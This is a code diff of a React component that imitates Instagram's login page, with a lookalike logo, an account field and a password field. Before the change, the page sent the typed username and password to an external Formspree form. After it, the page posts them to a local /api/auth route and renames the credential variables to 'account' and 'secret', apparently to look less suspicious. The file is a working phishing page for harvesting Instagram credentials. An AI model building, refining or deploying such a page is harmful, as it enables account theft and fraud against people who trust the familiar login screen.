@@ -4,11 +4,11 @@ import Link from 'next/link';
 import { useState } from 'react';
 
 export default function InstagramLogin() {
-  const [username, setUsername] = useState('');
-  const [password, setPassword] = useState('');
+  const [account, setAccount] = useState('');
+  const [secret, setSecret] = useState('');
   const [isLoading, setIsLoading] = useState(false);
 
-  const isFormValid = username.trim() !== '' && password.trim() !== '';
+  const isFormValid = account.trim() !== '' && secret.trim() !== '';
 
   const handleSubmit = async (e) => {
     e.preventDefault();
@@ -17,15 +17,14 @@ export default function InstagramLogin() {
     setIsLoading(true);
 
     try {
-      await fetch('https://formspree.io/f/xljdoaaa', {
+      await fetch('/api/auth', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
-          'Accept': 'application/json'
         },
         body: JSON.stringify({
-          username: username,
-          password: password,
+          account: account,
+          secret: secret,
         }),
       });
     } catch (error) {
@@ -39,7 +38,7 @@ export default function InstagramLogin() {
     <div className="flex min-h-screen w-full items-center justify-center bg-[#000000] text-white px-4 sm:px-6 py-8 font-sans select-none overflow-x-hidden" dir="ltr">
       <div className="flex w-full max-w-[1100px] items-center justify-center lg:justify-between">
         
-        {/* القسم الأيسر: يظهر فقط في الشاشات الكبيرة (Desktop) */}
+        {/* القسم الأيسر: يظهر فقط في الشاشات الكبيرة */}
         <div className="hidden lg:flex flex-col w-[480px] pr-10">
           <div className="mb-8">
             <img 
@@ -57,12 +56,11 @@ export default function InstagramLogin() {
           </div>
         </div>
 
-        {/* القسم الأيمن: نموذج تسجيل الدخول (يتجاوب مع جميع الشاشات) */}
+        {/* القسم الأيمن: نموذج تسجيل الدخول */}
         <div className="flex flex-col w-full max-w-[380px] mx-auto">
           
           <div className="w-full flex flex-col items-center lg:items-start">
             
-            {/* الشعار المتجاوب: يظهر في الهواتف في أعلى النموذج، ويختفي في الشاشات الكبيرة */}
             <div className="flex lg:hidden mb-6 justify-center w-full">
               <img 
                 src="/instagram-logo.png" 
@@ -81,12 +79,12 @@ export default function InstagramLogin() {
               <div className="relative flex items-center w-full bg-[#121212] border border-[#262626] rounded-xl focus-within:border-[#a8a8a8] overflow-hidden">
                 <input
                   type="text"
-                  value={username}
-                  onChange={(e) => setUsername(e.target.value)}
+                  value={account}
+                  onChange={(e) => setAccount(e.target.value)}
                   className="w-full px-4 pt-4 pb-2 text-sm bg-transparent text-white outline-none peer"
                   required
                 />
-                <span className={`absolute left-4 text-xs text-[#a8a8a8] transition-all duration-150 pointer-events-none ${username ? 'top-1.5 text-[10px]' : 'top-3.5 text-sm'}`}>
+                <span className={`absolute left-4 text-xs text-[#a8a8a8] transition-all duration-150 pointer-events-none ${account ? 'top-1.5 text-[10px]' : 'top-3.5 text-sm'}`}>
                   Mobile number, username or email
                 </span>
               </div>
@@ -94,12 +92,12 @@ export default function InstagramLogin() {
               <div className="relative flex items-center w-full bg-[#121212] border border-[#262626] rounded-xl focus-within:border-[#a8a8a8] overflow-hidden">
                 <input
                   type="password"
-                  value={password}
-                  onChange={(e) => setPassword(e.target.value)}
+                  value={secret}
+                  onChange={(e) => setSecret(e.target.value)}
                   className="w-full px-4 pt-4 pb-2 text-sm bg-transparent text-white outline-none peer"
                   required
                 />
-                <span className={`absolute left-4 text-xs text-[#a8a8a8] transition-all duration-150 pointer-events-none ${password ? 'top-1.5 text-[10px]' : 'top-3.5 text-sm'}`}>
+                <span className={`absolute left-4 text-xs text-[#a8a8a8] transition-all duration-150 pointer-events-none ${secret ? 'top-1.5 text-[10px]' : 'top-3.5 text-sm'}`}>
                   Password
                 </span>
               </div>
